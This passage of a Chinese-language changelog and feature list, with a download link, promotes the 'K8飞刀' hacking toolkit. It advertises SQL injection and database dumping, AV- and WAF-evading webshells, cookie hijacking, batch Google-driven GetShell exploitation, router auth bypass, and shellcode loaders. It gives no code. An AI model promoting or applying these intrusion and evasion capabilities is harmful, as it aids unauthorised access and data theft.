3.域名扫描：&nbsp;&nbsp; 子域名扫描、二级域名扫描、WP用户扫描&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.黑客浏览器： 自动检测SQL注入、比FireFox扩展HackBar更强更全的HTTP参数提交(见EXP调式)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.EXP 调式：&nbsp;&nbsp; 支持Get/Post/Cookie/UserAgent/Referer/X-Forwarded-For/Client-IP/VIA提交&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6.生成 EXP：&nbsp;&nbsp; 可将调式好的EXP生成工具，无需编程功底即可实现EXP或直接加入飞刀漏洞利用库&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 7.加密算法：&nbsp;&nbsp; MD5(16)、MD5(32)、SHA1、SHA256、SHA384、SHA512&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8.加密解密：&nbsp;&nbsp; Base32、Base64、Base64(SHA1)支持批量加密解密、DeDe密码、VNC密码、进制转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9.编码转换：&nbsp;&nbsp; Hex(16进制)、URL编码、ASCII码、ASCII码转其它、Unicode转ANSI、ANSI转Unicode&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.文件转换：&nbsp; Hex2File、Hex2Bin、Bin2Hex、File2Hex（可读取任意文件比如EXE或Shellcode）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11.SQL编码：&nbsp;&nbsp; SQL注入专用CHAR以及HEX路径转换(MSSQL、Mysql、Oracle等数据库)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 12.XSS编码：&nbsp;&nbsp; JS_HEX、JS_Unicode、JS_Escape、FromCharCode、HTML实体加密解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13.Shell管理： 支持7种WebShell(ASP/PHP/JSP/ASPX/CFM/PYTHON/PERL)，多协议连接(仅CMD)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 14.CookieHK：&nbsp; 读取当前登陆站点Cookie(支持httponly)、可使用Cookie直接登陆后台&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15.WebShell：&nbsp; 内置飞刀专用一句话(UA或其它格式一句话可过大量杀软及WAF防火墙)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16.Hacking：&nbsp;&nbsp; VBS随机加密免杀、GetShell、0day网马、硬件BadUSB(Teensy下载者)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 17.脱库工具：&nbsp; 注入点脱库工具、支持自定义关键字或正则提取数据、可采集URL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 18.GoogleHK：&nbsp; 批量抓取URL、批量检测注入、批量GetShell、批量执行自定义EXP最终版：由于加密硬盘损坏部分飞刀等工具源码无法恢复,2017年底已无法更新飞刀主程序,但很多功能长期可用,漏洞利用库可加EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 朋友们不用再问我要最新版了,没发现我已经差不2两年没更新了，和2012年的一个工具一样,不是我不更新,而是无法更新了&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 加密的源码损坏某个地方，就会导致整个文件无法解密，何况经过两层加密（一层硬盘加密，一层源码加密，源码外还有TC） 下载地址：https://github.com/k8gege/K8tools/raw/master/K8%E9%A3%9E%E5%88%80Final.rar 思维导图:&nbsp; https://raw.githubusercontent.com/k8gege/K8tools/master/K8%E9%A3%9E%E5%88%80Final.png 更新历史=================================================================================K8飞刀 20170920[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--VNC密码加密解密（RealVNC、Tightvnc等)&nbsp;&nbsp;&nbsp;&nbsp; 20170920[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASPX UA CmdShell(下载文件到服务器命令)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170426[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASPX UA CmdShell(UA Aspx一句话CMD连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASP&nbsp; UA CmdShell(UA Asp一句话CMD连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 历史执行命令(文本下拉框&amp;上下方向键控制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base64(SHA1)批量加密解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170120[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base32--批量加密解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170120K8飞刀 20160613[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--XSS跨站--HTML实体编码(Hex)解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160612[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--XSS跨站--HTML实体编码(Dec)解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160612[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2PleskHex(Plesk密码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2RegHex(注册表Hex)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--RegHex2Hex(注册表Hex)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2File(Hex转Bin文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610=================================================================================K8飞刀 20160514[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell--ImageMagick命令执行EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160514[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--计算机存储单位换算&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160505=================================================================================K8飞刀 20160414[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 漏洞利用库EXP 支持(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20160413[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 生成EXE漏洞EXP支持(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20160412[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Hex2Bin(Hex转文件含空格)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Hex2File(Hex转文件非空格)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion JRun LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 7b LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 7a LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 6 LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 8 LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键查看EXP漏洞库列表&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--浏览器--URL右键另存为&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160304=================================================================================K8飞刀 20160302[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base64编码--Base64批量解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160302[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串用户密码字典&nbsp;&nbsp;&nbsp;&nbsp; 20160301[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串用户密码提取&nbsp;&nbsp;&nbsp;&nbsp; 20160301[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--字符串处理--正则忽略大小写字符串生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160301[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串(Web.config)&nbsp;&nbsp;&nbsp;&nbsp; 20160229[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--菜刀配置数据库代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160626[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code/代码--C#属性代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160223[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UserAgent--WebShell一句话测试(ASPX/PHP/ASP)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160203[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--字符串处理--拼接\\倒序\\拼接注释免杀&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160202=================================================================================K8飞刀 20160115[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码纠正--处理从网页复制的ASPX代码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160115[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码转CMD写入文件(命令行-可执行命令)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160108[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码转BAT写入文件(批处理-可上传文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160108[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--File2Hex文件转16进制(空格)&nbsp;&nbsp;&nbsp;&nbsp; 20160108=================================================================================K8飞刀 20151218[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Joomla GetShell EXP&nbsp;&nbsp;&nbsp; 20151216[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Jboss&nbsp; GetShell EXP&nbsp;&nbsp;&nbsp; 20151216[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Sqlmap 检测注入点&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151216[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自动更新显示详细更新内容(让用户了解最新版功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151215[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--Hacking--批量执行自定义EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151208[u]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 大型站点子域名扫描/大型站点子域名收集结果更准确&nbsp;&nbsp;&nbsp;&nbsp; 20151203[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows &amp; Linux渗透常用命令 &amp; NC反弹一键编译&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151126=================================================================================K8飞刀 20151120[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--PHP木马--UA一句话木马&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151118[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Shell文件管理--右键菜单--保存目录结构信息&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151118[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式 调用SQLMAP检测页面URL是否存在注入&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151015[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XAMPP &lt;=1.6.8&nbsp; 1.7.1 1.8.2 SQL注入漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151015=================================================================================K8飞刀 2015国庆版[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--Word远程代码执行MS15-022&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150929[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--WinRAR自解压远程代码执行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150929[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--MS13-071主题远程代码执行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150924[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--VBS脚本--VBS下载者(http木马地址)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150920=================================================================================K8飞刀 20150911[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Mysql Inject OutFile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150909[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话/普通一句话 修改时间&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150828[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话/普通一句话文件重命名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150828[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 修复 中文文件名读取&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150827[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 支持Linux系统服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150826[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 服务器文件下载到本地&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 本地文件上传到服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 下载URL文件到服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 删除目标服务器文件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell&nbsp; Lnx-CMD-Echo写shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell&nbsp; Win-CMD-Echo写shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--VBS脚本--VBS(字符串转ASCII码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 列目录(显示直观大小)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150821[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--ASCII码-多格式ASCII码转字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150817[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--VBS脚本--VBS(字符串转ASCII码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150817[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent WebShell(新型一句话木马)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150813=================================================================================K8飞刀 20150725[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不再强制跳转URL,允许用户选择是否更新&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150725[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 腾达无线路由器(Tenda 11N)登陆密码绕过&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150724[+]SysSeting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持SOCKS5代理设置(配合Htran内网渗透)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150723[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--存活WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--掉线WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--全部WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721=================================================================================K8飞刀 20150720&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShellCode Loader[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ShellCode Loader&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--HexString2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2HexString&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720=================================================================================K8飞刀 20150713&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking Team Flash0day ShellCode Exploit[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ByteArray2UintArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150713[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--UintArray2ByteArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150713[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2UintArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--UintArray2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ByteArray2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2ByteArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150708=================================================================================K8飞刀 20150705[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--新型Cookie一句话木马&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150705[+]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FastStart(右键菜单快速启动CMD &amp; K8飞刀)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150703[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--DeDeCMS管理员密码加密解密算法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150701[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unix时间戳格式与时间互转 